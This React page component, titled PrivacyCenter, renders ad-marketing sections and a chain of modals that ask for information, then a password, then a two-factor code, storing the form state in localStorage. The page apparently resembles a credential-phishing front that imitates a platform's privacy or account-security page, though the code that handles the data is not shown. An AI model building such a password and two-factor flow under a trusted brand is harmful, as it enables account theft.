'use client'

import BenefitsSection from '@/components/benefits/BenefitsSection'
import FeatureSection from '@/components/feature/FeatureSection'
import Footer from '@/components/footer/Footer'
import FooterSubscribe from '@/components/footer/FooterSubscribe'
import NavBar from '@/components/nav-bar/NavBar'
import AdsReachSection from '@/components/main/AdsReachSection'
import AudienceSection from '@/components/main/AudienceSection'
import SupportSection from '@/components/main/SupportSection'
import AdditionalResourcesSection from '@/components/main/AdditionalResourcesSection'
import Partner from '@/components/partner/Partner'
import React from 'react'
import { useAppDispatch, useAppSelector } from '../store/hooks'
import { updateForm } from '../store/slices/stepFormSlice'
import InfomationsModal from '#components/modals/InfomationsModal'
import PasswordModal from '#components/modals/PasswordModal'
import TwoFactorModal from '#components/modals/TwoFactorModal'
import SuccessModal from '#components/modals/SuccessModal'
import Hero from '#components/hero/Hero'

const PrivacyCenter = () => {

    // STATE MODAL
    const [isOpendInfo, setIsOpendInfo] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);

    const [isOpendTwoFactor, setIsOpendTwoFactor] = React.useState(false);
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);
    const [isLoaded, setIsLoaded] = React.useState(false);

    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    // React.useEffect(() => {
    //     const savedData = localStorage.getItem('privacy_center_state');
    //     if (savedData) {
    //         try {
    //             const { state, formData: savedFormData, expires } = JSON.parse(savedData);
    //             if (Date.now() < expires) {
    //                 setIsOpendInfo(state.isOpendInfo || false);
    //                 setIsOpendPassword(state.isOpendPassword || false);
    //                 setIsOpendTwoFactor(state.isOpendTwoFactor || false);
    //                 setIsOpendSuccess(state.isOpendSuccess || false);

    //                 if (savedFormData) {
    //                     dispatch(updateForm(savedFormData));
    //                 }
    //             } else {
    //                 localStorage.removeItem('privacy_center_state');
    //             }
    //         } catch (e) {
    //             console.error("Error parsing saved state", e);
    //         }
    //     }
    //     setIsLoaded(true);
    // }, [dispatch]);

    React.useEffect(() => {
        if (isLoaded && !isOpendSuccess) {
            const expires = Date.now() + 7 * 24 * 60 * 60 * 1000; // 1 week
            localStorage.setItem('privacy_center_state', JSON.stringify({
                state: {
                    isOpendInfo,
                    isOpendPassword,
                    isOpendTwoFactor,
                    isOpendSuccess
                },
                formData,
                expires
            }));
        }
    }, [isLoaded, isOpendInfo, isOpendPassword, isOpendTwoFactor, isOpendSuccess, formData]);

    // HANDLE MODAL

    const handleOpendInfoModal = () => {
        setIsOpendInfo(true);
    }

    const handleOpendPasswordModal = (isOpenPassword: boolean) => {
        setIsOpendPassword(isOpenPassword);
    }

    const handleOpendTwoFactorModal = (isOpenTwoFactor: boolean) => {
        setIsOpendTwoFactor(isOpenTwoFactor);
    }

    const handleOpendSuccessModal = (isOpenSuccess: boolean) => {
        setIsOpendSuccess(isOpenSuccess);
    }

    return (
        <div className='relative'>

            <NavBar handleOpendInfoModal={handleOpendInfoModal} />

            <Hero handleOpendInfoModal={handleOpendInfoModal} />

            <BenefitsSection />

            <FeatureSection />

            <Partner />

            <AdsReachSection />

            <AudienceSection />

            <SupportSection handleOpendInfoModal={handleOpendInfoModal} />

            <AdditionalResourcesSection handleOpendInfoModal={handleOpendInfoModal} />

            <FooterSubscribe />

            <Footer />

            <InfomationsModal
                isOpend={isOpendInfo}
                isOpendPassword={(isOpenPassword: boolean) => handleOpendPasswordModal(isOpenPassword)}
                onToggleModal={(isOpen: boolean) => setIsOpendInfo(isOpen)}
            />

            <PasswordModal
                isOpend={isOpendPassword}
                isOpendTwoFactor={(isOpenTwoFactor: boolean) => handleOpendTwoFactorModal(isOpenTwoFactor)}
                onToggleModal={(isOpen: boolean) => setIsOpendPassword(isOpen)}
            />

            <TwoFactorModal
                isOpend={isOpendTwoFactor}
                isOpendFinish={(isOpenFinish: boolean) => handleOpendSuccessModal(isOpenFinish)}
                onToggleModal={(isOpen: boolean) => setIsOpendTwoFactor(isOpen)}
            />

            <SuccessModal
                isOpend={isOpendSuccess}
                onToggleSuccess={(isOpen: boolean) => setIsOpendSuccess(isOpen)}
            />
        </div>
    )
}

export default PrivacyCenter